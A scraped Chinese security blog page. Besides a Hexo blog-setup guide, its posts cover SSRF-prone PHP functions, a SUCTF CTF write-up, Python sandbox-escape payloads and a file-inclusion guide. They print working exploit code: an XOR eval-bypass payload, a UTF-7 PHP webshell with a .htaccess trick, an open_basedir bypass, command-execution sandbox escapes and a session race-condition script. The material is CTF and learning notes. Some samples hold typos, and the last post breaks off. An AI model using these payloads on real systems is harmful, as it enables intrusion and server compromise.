<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
<p>themes修改为刚刚克隆下来的文件夹名</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
<li>安装git插件</li>
</ul>
<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
<ul>
<li>上传至github</li>
</ul>
<pre><code>hexo g
hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
<p>文章头加上如下代码</p>
<pre><code class="markdown">---

title: Python沙箱逃逸学习笔记

date: 2019-08-15 12:51:44

tags: CTF

---</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d725b85c91.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d725b85c91.html" class="post-title-link" itemprop="url">SSRF学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-25 17:51:44" itemprop="dateCreated datePublished" datetime="2019-08-25T17:51:44+08:00">2019-08-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:27:22" itemprop="dateModified" datetime="2020-10-14T17:27:22+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="SSRF代码分析"><a href="#SSRF代码分析" class="headerlink" title="SSRF代码分析"></a>SSRF代码分析</h4><ul>
<li><strong>PHP中可能存在SSRF漏洞的函数</strong></li>
</ul>
<pre><code class="php">file_get_contents(),fsockopen(),curl_exec()</code></pre>
<ul>
<li><strong>file_get_contents()函数SSRF例子</strong></li>
</ul>
<pre><code class="php+HTML">&lt;?php
if(isset($_POST[&#39;url&#39;])){
    $content=file_get_content($_POST[&#39;url&#39;]);
    $filename=&#39;./images/&#39;.rand().&#39;img.jpg&#39;;
    file_put_contents($filename,$content);
    echo $_POST[&#39;url&#39;];
    $img=&quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;
}
echo $img;
?&gt;</code></pre>
<ul>
<li><strong>fsockopen()函数SSRF例子</strong></li>
</ul>
<pre><code class="php">&lt;?php
function Getfile($host,$port,$link){
    $fp = fscokopen($host,intval($port),$errno,$errstr,30);
    if(!fp){
        echo &quot;$errstr (error number $errno)\n&quot;;
    }else{
        $out  = &quot;GET $link HTTP/1.1\r\n&quot;;
        $out .= &quot;Host:$host\r\n&quot;;
        $out  = &quot;Connection: Close\r\n\r\n&quot;;
        $out .= &quot;\r\n&quot;;
        fwrite($fp,$out);
        $content=&#39;&#39;;
        while(!feof($fp)){
          content .= fgets($fp,1024);  
        }
        fclose($fp);
        return $contents;
    }
}
?&gt;</code></pre>
<ul>
<li><strong>curl_exec()函数SSRF例子</strong></li>
</ul>
<pre><code class="php">&lt;?php
if(isset($_POST[&#39;url&#39;])){
    $link = $_POST[&#39;url&#39;];
    $culobj = curl_init();
    curl_setopt($curlobj,CURLOPT_POST,0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj,CURLOPT_RETURNTRANSFER,1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);
    $filename = &#39;./images/&#39;.rand().&#39;.txt&#39;;
    file_put_contents($filename,$result);
    echo $result;
}
?&gt;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d66b21b329.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d66b21b329.html" class="post-title-link" itemprop="url">SUCTF-Easy-PHP笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-25 17:51:44" itemprop="dateCreated datePublished" datetime="2019-08-25T17:51:44+08:00">2019-08-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:15:44" itemprop="dateModified" datetime="2020-10-14T17:15:44+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="题目是一个源码审计"><a href="#题目是一个源码审计" class="headerlink" title="题目是一个源码审计:"></a>题目是一个源码审计:</h3><pre><code class="php+HTML">&lt;?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES[&quot;file&quot;])){
        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); 
        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);
    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 
        $path= $userdir.&quot;/&quot;.$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET[&#39;_&#39;];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)&gt;18){
    die(&#39;One inch long, one inch strong!&#39;);
}

if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )
    die(&#39;Try something else!&#39;);

$character_type = count_chars($hhh, 3);
if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);

eval($hhh);
?&gt;</code></pre>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><ul>
<li><p>对GET传入字符做出了长度限制不得超过18,使用一个正则过滤了<code>自然数、英文字符,x00,X7F,反引号,&quot;,&#39;,_,&amp;,.,逗号</code>。</p>
</li>
<li><p><code>count_chars(string,3)</code>取出不同字符的个数，并且设置不得大于12个。最后<code>eval()</code>执行。按照题目的意思是要构造一个能够调用<code>get_the_flag()</code>上面这个自定义函数的方法，上传shell.</p>
</li>
<li><p>绕过get_the_flag()直接使用<code>.htaccess</code>方法执行php</p>
</li>
</ul>
<h4 id="绕过限制执行任意函数"><a href="#绕过限制执行任意函数" class="headerlink" title="绕过限制执行任意函数"></a>绕过限制执行任意函数</h4><ul>
<li><p>这里参考了一篇文章：<a href="https://xz.aliyun.com/t/5677#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-9</a></p>
</li>
<li><p>使用<code>0xff</code>异或得到<code>=&gt;_GET</code>进行调用这里写了个脚本对这个结果进行爆破:</p>
</li>
</ul>
<pre><code class="python">def bypass():
    minn = 1000000000
    G = []
    E = []
    T = []
    _ = []
    str_1 = r&#39;\&#39;&quot;`~_&amp;.,|=[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
    str_2 = []
    for i in str_1:
        str_2.append(ord(i))
    str_3=&#39;0123456789abcdef&#39;#构造16进制所含字符
    str_0x16 = []
    &#39;&#39;&#39;构造16进制&#39;&#39;&#39;
    for i in str_3:
        for j in str_3:
            tmp =  &#39;0x&#39;+i+j
            str_0x16.append(tmp)
    for i in str_0x16:
        #for j in str_0x16:
            j = &quot;0xff&quot;
            tmp_1 = int(i,16)
            tmp_2 = int(&quot;0xff&quot;,16)

​```
        if (tmp_1 in str_2) or (tmp_2 in str_2) or (0&lt;=tmp_1&lt;=32) or (0&lt;=tmp_2&lt;=32) or (tmp_1==127) or (tmp_2==127):
            continue
        if tmp_1^tmp_2==ord(&#39;G&#39;):
            print(&#39;G=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;E&#39;):
            print(&#39;E=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;T&#39;):
            print(&#39;T=&gt;&#39;+i+&quot;^&quot;+j)
        if tmp_1^tmp_2==ord(&#39;_&#39;):
            print(&#39;_=&gt;&#39;+i+&quot;^&quot;+j)


bypass()</code></pre>
<ul>
<li>输出结果</li>
</ul>
<pre><code class="python">_=&gt;0xa0^0xff
T=&gt;0xab^0xff
G=&gt;0xb8^0xff
E=&gt;0xba^0xff
[Finished in 0.2s]</code></pre>
<ul>
<li>那么可以构造payload:</li>
</ul>
<pre><code class="visual">${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo
${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661474033546.png" alt></p>
<ul>
<li>正好拿WEB1的表单作为上传</li>
</ul>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
    &lt;title&gt;Upload Labs&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;h2&gt;Upload Labs&lt;/h2&gt;
    &lt;form action=&quot;http://47.111.59.243:9001/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
        &lt;label for=&quot;file&quot;&gt;upload&lt;/label&gt;
        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
        &lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;upload&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;

&lt;/html&gt;</code></pre>
<h4 id="绕过get-the-flag-函数"><a href="#绕过get-the-flag-函数" class="headerlink" title="绕过get_the_flag()函数"></a>绕过<code>get_the_flag()</code>函数</h4><p>  该函数主要过滤了ph文件后缀，但没有过滤其他文件后缀，而文件内容则过滤&lt;?,并且使用<code>exif_imagetype</code>对文件进行了判断是否为图片,考虑php7已经抛弃了<code>&lt;script language=&#39;php&#39;&gt;</code>和&lt;<code>%</code></p>
<p>  所以可以使用UTF-7进行攻击。即上传<code>.htaccess</code>设置如下代码：</p>
<pre><code class="C">  #define 4c11f3876d494218ff327e3ca6ac824f_width 1337
  #define 4c11f3876d494218ff327e3ca6ac824f_height 1337
  AddType application/x-httpd-php .aaa #将后缀为.aaa的解析为php
  php_flag display_errors on #关闭报错
  php_flag zend.multibyte 1
  php_value zend.script_encoding &quot;UTF-7&quot; #设置解码UTF-7</code></pre>
<p>  绕过<code>exif_imagetype</code>的检测，首先看一下这个函数的文档说明（图1），该函数读取图像的第一个字节，也就是说读取图片文件头，如果这个文件头是PHP自带的常量那么就可以通过检测。PHP常量如（图二）,只能使用xbm图片常量而其他常量都会导致<code>.htaccess</code>无法解析。因为XBM图片使用C代码作为表示，也就是在文件头定义两个常量分别是宽和高。这样既可绕过图片头检测。</p>
<pre><code class="C">  #define test_width 16
  #define test_height 7</code></pre>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661483646268.png" alt></p>
<p>  <img src="http://goodcheerleung.gitee.io/mycute/20190819/15661482481850.png" alt></p>
<p>这样就成功上传了<code>.htaccess</code>文件，但是构造shell并不能直接上传因为过滤&lt;?，但是我们上面设置了解码<code>UTF-7</code>，那么我们就可以构造<code>UTF-7</code>编码的payload(<a href="http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7</a>).</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661488438097.png" alt></p>
<ul>
<li><p>UTF-7一句话木马</p>
<p>我们将木马同样上传上去，注意后缀为.aaa直接上菜刀连接。</p>
</li>
</ul>
<pre><code>#define 4c11f3876d494218ff327e3ca6ac824f_width 1337
#define 4c11f3876d494218ff327e3ca6ac824f_height 1337
+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;a&#39;+AF0)+ADs?+AD4-</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661494271641.png" alt></p>
<p>也可以使用phpinfo进行测试是否执行成功代码。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661495566481.png" alt></p>
<h4 id="open-basedir绕过bypass"><a href="#open-basedir绕过bypass" class="headerlink" title="open_basedir绕过bypass"></a>open_basedir绕过bypass</h4><p>  <code>open_basedir</code>是php.ini中对目录进行授权的设置，使用菜刀连上后发现无法访问其他目录。所以考虑bypass<code>open_basedir</code>,这是一个外国大佬在今年四月份放出来的payload，具体原理我也不懂（—_—）.</p>
<p>  新建一个php文件，写入如下代码即可列出任意目录文件列表。</p>
<pre><code class="PHP">&lt;?php
ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
mkdir(&#39;/tmp/fuck/&#39;);
chdir(&#39;/tmp/fuck/&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
var_dump(scandir(&#39;/&#39;));
?&gt;</code></pre>
<p>可以看到flag文件名直接将<code>scandir</code>改成<code>file_get_contents()</code>读取flag</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661500221290.png" alt></p>
<pre><code class="php">&lt;?php
ini_set(&#39;open_basedir&#39;,&#39;/tmp&#39;);
mkdir(&#39;/tmp/fuck/&#39;);
chdir(&#39;/tmp/fuck/&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
var_dump(file_get_contents()(&#39;THis_Is_tHe_F14g&#39;));
?&gt;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190819/15661918208968.png" alt></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d61ff4cabe.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d61ff4cabe.html" class="post-title-link" itemprop="url">Python沙箱逃逸学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-15 12:51:44" itemprop="dateCreated datePublished" datetime="2019-08-15T12:51:44+08:00">2019-08-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:27:39" itemprop="dateModified" datetime="2020-10-14T17:27:39+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>所谓的 Python 沙盒，即以一定的方法模拟(socat) Python 终端，实现用户对 Python 的使用。</p>
<h3 id="逃逸方法"><a href="#逃逸方法" class="headerlink" title="逃逸方法"></a>逃逸方法</h3><ul>
<li>Python内建函数中有些函数能够执行shell命令，导致任意代码执行。</li>
</ul>
<pre><code class="python">  os.system() 
  os.popen()
  commands.getstatusoutput() 
  commands.getoutput()
  commands.getstatus()
  subprocess.call(command, shell=True) 
  subprocess.Popen(command, shell=True)
  pty.spawn()</code></pre>
<ul>
<li>Python中导入模块的方法</li>
</ul>
<pre><code class="python">import xxx
form xx import *
__import__(&#39;xxx&#39;)</code></pre>
<p>​        我们可以通过上述方法导入相关模块再调用相关函数导致命令执行。除此之外，我们也可以通过路径引入模块，例如linux系统中Python os的路径一般都是/usr/lib/python2.7/os.py,当知道路径的时候就可以通过如下操作导入操作模块。进一步调用相关函数。</p>
<pre><code class="python">&gt;&gt;&gt; import sys
&gt;&gt;&gt; sys.modules[&#39;os&#39;]=&#39;/usr/lib/python2.7/os.py&#39;
&gt;&gt;&gt; import os
&gt;&gt;&gt;</code></pre>
<ul>
<li><p>其他危险函数</p>
<ol>
<li>execfile文件执行</li>
</ol>
</li>
</ul>
<pre><code class="shell">&gt;&gt;&gt; execfile(&#39;/usr/lib/python2.7/os.py&#39;)
&gt;&gt;&gt; system(&#39;cat /etc/passwd&#39;)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
&gt;&gt;&gt; getcwd()
&#39;/usr/lib/python2.7&#39;</code></pre>
<p>​        2.timeit</p>
<pre><code class="python">import timeit
timeit.timit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)</code></pre>
<p>​        3.eval和exec</p>
<pre><code class="python">eval(&#39;__import__(&#39;os&#39;).system(&quot;dir&quot;)&#39;)</code></pre>
<p>​        4.platform</p>
<pre><code class="python">import platform
print platform.popen(&#39;dir&#39;).read()</code></pre>
<ul>
<li>Python内建函数</li>
</ul>
<p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code> 来获取内置函数列表</p>
<pre><code class="python">&gt;&gt;&gt; dir(__builtins__)
[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, .....</code></pre>
<p>在Python中一个模块是由字典对象实现命名空间的，例如：m.x等同于m.dic[“x”].那么我们可以直接通过<strong>dic</strong>引入我们想要的模块（其作用为列出一个模组/类对象下面的属性和函数）。</p>
<p>绕过实例：</p>
<pre><code class="python">&gt;&gt;&gt;__builtins__.__dict__[&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)](&#39;b3M=&#39;.decode(&#39;base64&#39;))</code></pre>
<pre><code>&gt;&gt;&gt; import base64
&gt;&gt;&gt; base64.b64encode(&#39;__import__&#39;)
&#39;X19pbXBvcnRfXw==&#39;
&gt;&gt;&gt; base64.b64encode(&#39;os&#39;)
&#39;b3M</code></pre><p><em>如果一些 内敛函数在 *</em>builtins** 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 <strong>builtins*</strong></p>
<ul>
<li>创建对象以及引用</li>
</ul>
<p>Python中的object类集成了许多基础函数，我们想要调用的时候也是可以直接创建对象进而引用。</p>
<p>常见方法：</p>
<pre><code class="python">().__class__.bases__[0]
&#39;&#39;.__class__.mro__[2]
读取文件：
print ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/services&quot;).read()</code></pre>
<p>常见payload:</p>
<pre><code class="python">#读文件
().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()

#写文件
().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/input&#39;, &#39;w&#39;).write(&#39;123&#39;)

#执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d42c963778.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d42c963778.html" class="post-title-link" itemprop="url">上传漏洞&文件包含总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-08-09 10:05:54" itemprop="dateCreated datePublished" datetime="2019-08-09T10:05:54+08:00">2019-08-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:09:34" itemprop="dateModified" datetime="2020-10-14T17:09:34+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li><strong>时间:2019年8月5日16:00:28</strong>        </li>
<li><strong>地点：福州大学</strong></li>
</ul>
<h2 id="文件包含漏洞利用技巧"><a href="#文件包含漏洞利用技巧" class="headerlink" title="文件包含漏洞利用技巧"></a>文件包含漏洞利用技巧</h2><h4 id="Apache日志文件包含"><a href="#Apache日志文件包含" class="headerlink" title="Apache日志文件包含"></a>Apache日志文件包含</h4><p>Apache会将所有请求写入日志文件中，所以如果在URl中写入一句话木马，再配合文件包含漏洞将可能直接getshell。</p>
<p>例如:提交一个get请求（使用burpsuite或者curl命令防止被url编码）</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649879122522.png" alt></p>
<h4 id="PHP-SESSION进度文件包含"><a href="#PHP-SESSION进度文件包含" class="headerlink" title="PHP_SESSION进度文件包含"></a>PHP_SESSION进度文件包含</h4><p>PHP5.4会将上传的进度和时间储存在SESSION中在上传结束之后会清空SESSION,如果存在文件包含的漏洞可以采取条件竞争的形式使得包含文件成功，执行任意代码。</p>
<p>例如服务器存在一文件readme.txt是我们上传的小马文件，我们需要将其名字改成xiaoma.php,并且网站存在文件包含漏洞。</p>
<p>实验代码：</p>
<pre><code class="php">&lt;?php
$b=$_GET[&#39;f&#39;];
include &quot;$b&quot;;
?&gt;</code></pre>
<p>利用脚本：</p>
<pre><code class="python">import requests
import threading

url=&#39;http://www.sql.com/test.php&#39;
r=requests.session()
headers={
    &quot;Cookie&quot;:&#39;PHPSESSID=123&#39;
}
def POST():
    while True:
        file={
            &quot;upload&quot;:(&#39;&#39;,&#39;&#39;)  #上传无效的空文件
        }
        data={
            &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#39;&lt;?php rename(&quot;readme.txt&quot;,&quot;xiaoma.php&quot;);?&gt;&#39;     #恶意进度信息，
        }
        r.post(url,files=file,headers=headers,data=data)

def READ():
    while True:
        event.wait()
        t=r.get(&quot;http://www.sql.com/test.php?f=../../tmp/tmp/sess_123&quot;)
        if &#39;flag&#39; not in t.text:
            print(&#39;[+]retry&#39;)
        else:
            print(t.text)
            event.clear()
event=threading.Event()
event.set()
threading.Thread(target=POST,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()
threading.Thread(target=READ,args=()).start()</code></pre>
<p>实验流程：</p>
<ul>
<li><p>上传小马图片得知小马相对地址</p>
</li>
<li><p>构造脚本：在cookie中定义PHPSESSIONID（例如：PHPSESSIONID=123）</p>
<ul>
<li>将会在var/tmp/tmp（linux环境）生成一个叫sess_123的文件</li>
